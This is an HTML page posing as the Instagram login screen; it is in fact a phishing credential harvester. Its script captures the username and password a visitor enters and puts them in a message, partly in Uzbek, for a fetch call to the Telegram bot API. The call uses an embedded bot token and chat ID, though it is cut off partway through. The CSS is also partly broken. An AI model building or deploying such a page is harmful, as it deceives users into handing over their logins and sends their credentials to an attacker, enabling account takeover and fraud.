
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Instagram ‚Ä¢ Log in</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;

    }
    input {

      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #3897f0;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;

    }
    h2 {

</head>
<body>
  <form id="loginForm">
    <h2>Login to Instagram</h2>
    <input type="text" id="username" placeholder="Phone number, username, or email" required />
    <input type="password" id="password" placeholder="Password" required />
    <button type="submit">Log in</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const token = "7916647257:AAG9BqnnLpblLarIjqigF0D00h--T5m-N5M";
      const chatId = "6498632307";
      const message = `üõ°Ô∏è Instagram Login ma'lumotlari:\nüë§ Username: ${username}\nüîë Password: ${password}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {

  </script>
</body>
